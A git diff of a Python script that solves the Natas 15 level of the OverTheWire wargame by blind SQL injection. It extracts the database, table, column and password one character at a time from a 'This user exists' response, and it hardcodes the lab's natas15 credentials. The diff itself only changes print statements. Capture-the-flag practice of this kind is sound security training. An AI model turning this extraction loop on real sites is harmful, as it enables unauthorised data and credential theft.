@@ -1,8 +1,7 @@
 import requests
-import re
 
 def flag(url,username,password,len_alphanum,table,column):
-    print("Getting password for natas15:")
+    print("Extracting password:")
     alpha_num = "012345789abcdefgijklmnopqrstuvwxyzABCDEFGIJKLMNOPQRSTUVWXYZ6hH" 
     flag = ""
     letter = 0
@@ -14,10 +13,9 @@ def flag(url,username,password,len_alphanum,table,column):
         if "This user exists" in sqli_r.text:
             flag = flag + alpha_num[letter]
             letter = 0
-            print(flag)
         else:
             letter += 1
-    print("The flag is: " + flag) 
+    print("The flag for natas15 is: " + flag) 
 
 def cols(url,username,password,alpha_num,len_alphanum,database,table):
     print("Getting column")
@@ -31,9 +29,10 @@ def cols(url,username,password,alpha_num,len_alphanum,database,table):
         if "This user exists" in sqli_r.text:
             column = column + alpha_num[letter]
             letter = 0
-            print(column)
+    
         else:
             letter += 1
+    print("Column is: " + column)
     flag(url,username,password,len_alphanum,table,column)
 
 def tables(url,username,password,alpha_num,len_alphanum,database):
@@ -48,9 +47,9 @@ def tables(url,username,password,alpha_num,len_alphanum,database):
         if "This user exists" in sqli_r.text:
             table = table + alpha_num[letter]
             letter = 0
-            print(table)
         else:
             letter += 1
+    print("Table is: " + table)
     cols(url,username,password,alpha_num,len_alphanum,database,table)
 
 def database(url,username,password):
@@ -71,13 +70,13 @@ def database(url,username,password):
         if "This user exists" in sqli_r.text:
             database = database + alpha_num[letter]
             letter = 0
-            print(database)
         else:
             letter += 1
+    print("Database is: " + database)
     tables(url,username,password,alpha_num,len_alphanum,database)
 
 if __name__=="__main__":
-    print("Natas 15: SQL Injection time")
+    print("Natas 15: SQL Injection time. Patience...")
     url = "http://natas15.natas.labs.overthewire.org/"
     username = "natas15"
     password = "TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB"
